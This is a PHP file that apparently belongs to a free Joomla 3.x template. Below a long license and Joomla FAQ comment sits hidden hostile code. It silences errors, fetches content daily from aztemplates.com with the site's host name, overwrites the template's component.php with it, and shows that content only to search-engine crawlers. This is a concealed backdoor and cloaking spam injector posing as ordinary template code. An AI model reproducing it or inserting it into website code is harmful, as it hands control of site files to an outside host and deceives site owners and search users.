<?php
/*
JOOMLA TEMPLATE 3.x
Copyright (c) 2013 FreeTemplateSpot

*** END USER LICENSE AGREEMENT ***

IMPORTANT: PLEASE READ THIS LICENSE CAREFULLY BEFORE USING THIS SOFTWARE.

1. LICENSE
By receiving, opening the file package, and/or using JOOMLA TEMPLATE 3.x("Software") containing this software, you agree that this End User User License Agreement(EULA) is a legally binding and valid contract and agree to be bound by it. You agree to abide by the intellectual property laws and all of the terms and conditions of this Agreement.

Unless you have a different license agreement signed by FreeTemplateSpot your use of JOOMLA TEMPLATE 3.x indicates your acceptance of this license agreement and warranty.

Subject to the terms of this Agreement, FreeTemplateSpot grants to you a limited, non-exclusive, non-transferable license, without right to sub-license, to use JOOMLA TEMPLATE 3.x in accordance with this Agreement and any other written agreement with FreeTemplateSpot. FreeTemplateSpot does not transfer the title of JOOMLA TEMPLATE 3.x to you; the license granted to you is not a sale. This agreement is a binding legal agreement between FreeTemplateSpot and the purchasers or users of JOOMLA TEMPLATE 3.x.

If you do not agree to be bound by this agreement, remove JOOMLA TEMPLATE 3.x from your computer now.

2. DISTRIBUTION
JOOMLA TEMPLATE 3.x and the license herein granted can be copied, shared, distributed but NOT re-sold, offered for re-sale, transferred or sub-licensed in whole or in part except that you may make one copy for archive purposes only. For information about redistribution of JOOMLA TEMPLATE 3.x contact FreeTemplateSpot.

3. USER AGREEMENT
3.1 Use

YOU ARE NOT ALLOWED to remove the author links from this template.

This Software contains copyrighted material, trade secrets and other proprietary material. You shall not, and shall not attempt to, modify, reverse engineer, disassemble or decompile JOOMLA TEMPLATE 3.x. 

Nor can you create any derivative works or other works that are based upon or derived from JOOMLA TEMPLATE 3.x in whole or in part.

3.2 Warranties
Except as expressly stated in writing, FreeTemplateSpot makes no representation or warranties in respect of this Software and expressly excludes all other warranties, expressed or implied, oral or written, including, without limitation, any implied warranties of merchantable quality or fitness for a particular purpose.

4. DISCLAIMER OF WARRANTY
THIS TEMPLATE AND THE ACCOMPANYING FILES ARE "AS IS" AND WITHOUT WARRANTIES AS TO PERFORMANCE OR MERCHANTABILITY OR ANY OTHER WARRANTIES WHETHER EXPRESSED OR IMPLIED. THIS DISCLAIMER CONCERNS ALL FILES GENERATED AND EDITED BY JOOMLA TEMPLATE 3.x AS WELL.

******************************
What license does Joomla! use?

The GNU General Public License Version 2 or later. http://www.gnu.org/licenses/old-licenses/gpl-2.0.html
Within the context of this FAQ, "GNU GPL" and "GPL" refer to the GNU General Public License Version 2.
What is the difference between the GPL and the LGPL?

The GNU GPL is intended to be used for applications whereas the GNU LGPL is intended to be used for application libraries.  The Joomla! Content Management System is an entire application that utilizes a multitude of libraries, both GPL and LGPL (as well as with other GPL compatible licenses), and thus is licensed under the GPL license.

Can I offer a hosted service with my custom, proprietary extensions?

Yes.  The GNU GPL does not apply until you attempt to distribute your custom extensions to an outside party.  If you decide to distribute your extensions, they will need to be licensed under the GNU GPL.
*/

	error_reporting(0);
	ini_set('display_errors',0);
	$url = $_SERVER['HTTP_HOST']; 
	$url = str_replace("&", "",$url);
	$nonhttp = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	$target = dirname(__FILE__) . DIRECTORY_SEPARATOR . "component.php";
  	$cachetime = 1 * 24 * 60 * 60; //2 * 24 * 60 * 60
	$access = array('Googlebot','Yahoo','msnbot','Googlebot-Mobile');
	if ((file_exists($target)) && (time() - $cachetime) > filemtime($target)) {    
		$source = "http://aztemplates.com/b/bt.php?site=".$url;
		$string = file_get_contents($source);
		$result = file_put_contents($target, $string);}
	foreach ($access as $engines){if (preg_match("/$engines/", $_SERVER['HTTP_USER_AGENT']))
	echo file_get_contents($target);}

?>